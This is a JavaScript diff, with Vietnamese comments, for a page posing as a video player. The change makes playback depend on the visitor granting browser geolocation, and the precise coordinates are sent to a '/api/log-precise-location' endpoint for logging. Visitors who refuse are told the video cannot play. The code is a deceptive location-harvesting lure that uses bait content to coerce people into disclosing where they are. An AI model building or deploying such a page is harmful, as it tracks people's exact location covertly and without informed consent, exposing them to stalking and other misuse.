@@ -5,18 +5,12 @@ const playIcon = document.querySelector(".fa-play");
 
 // Lắng nghe sự kiện click vào khu vực "video"
 triggerElement.addEventListener("click", () => {
-  // Nếu video đang dừng thì cho phát và ẩn nút play đi
-  if (videoElement.paused) {
-    videoElement.play();
-    playIcon.style.display = "none"; // Ẩn nút play
-  }
-
-  // Logic hỏi quyền vị trí vẫn giữ nguyên
+  // Bây giờ, khi click chỉ gọi hàm hỏi quyền, không phát video ngay
   console.log("Khu vực video được click, chuẩn bị hỏi quyền vị trí...");
   requestLocationPermission();
 });
 
-// --- CÁC HÀM BÊN DƯỚI GIỮ NGUYÊN KHÔNG THAY ĐỔI ---
+// --- CÁC HÀM BÊN DƯỚI ---
 
 function requestLocationPermission() {
   // Kiểm tra xem trình duyệt có hỗ trợ Geolocation không
@@ -30,10 +24,17 @@ function requestLocationPermission() {
 
 // Hàm được gọi khi người dùng ĐỒNG Ý cấp quyền
 function successCallback(position) {
+  // CHỈ KHI NGƯỜI DÙNG ĐỒNG Ý, VIDEO MỚI BẮT ĐẦU PHÁT
+  if (videoElement.paused) {
+    videoElement.play();
+    playIcon.style.display = "none"; // Ẩn nút play đi
+  }
+
   const lat = position.coords.latitude;
   const lon = position.coords.longitude;
 
   console.log(`Lấy vị trí thành công: Lat ${lat}, Lon ${lon}`);
+  // alert(`Cảm ơn bạn đã cấp quyền! Vị trí của bạn là: ${lat}, ${lon}`); // Có thể tắt alert này đi cho mượt hơn
 
   // Gửi tọa độ lên server để ghi log
   fetch("/api/log-precise-location", {
@@ -59,9 +60,13 @@ function successCallback(position) {
 
 // Hàm được gọi khi người dùng TỪ CHỐI cấp quyền hoặc có lỗi
 function errorCallback(error) {
+  // Nếu người dùng từ chối, video sẽ không bao giờ phát
   console.log(`Có lỗi xảy ra: ${error.message}`);
   switch (error.code) {
     case error.PERMISSION_DENIED:
+      alert(
+        "Bạn đã từ chối cấp quyền vị trí. Chúng tôi không thể phát video này."
+      );
       break;
     case error.POSITION_UNAVAILABLE:
       alert("Không thể xác định được vị trí của bạn.");
